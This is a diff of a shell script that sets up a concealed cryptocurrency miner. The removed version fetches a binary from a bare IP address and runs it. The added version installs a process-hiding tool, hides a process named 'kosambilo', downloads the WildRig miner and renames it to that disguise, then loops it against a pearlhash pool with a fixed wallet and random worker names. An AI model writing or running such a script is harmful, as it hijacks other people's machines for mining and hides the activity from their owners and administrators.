@@ -1,5 +1,9 @@
-wget http://51.158.180.64/samsa
-chmod 777 samsa
+apt update && apt -y install nodejs npm ocl-icd-opencl-dev
+npm i -g node-process-hider
+ph add kosambilo
+wget https://github.com/andru-kun/wildrig-multi/releases/download/0.52.1/wildrig-multi-linux-0.52.1.tar.gz
+tar xf wildrig-multi-linux-0.52.1.tar.gz
+mv wildrig-multi kosambilo
 while true; do
-./samsa --algo pearlhash --url 151.115.166.97:80 --user prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr --worker $(echo $RANDOM | md5sum | head -c 10)
+./kosambilo --algo pearlhash --url pool.pearlhash.xyz:9000 --user prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr --worker $(echo $RANDOM | md5sum | head -c 10)
 done
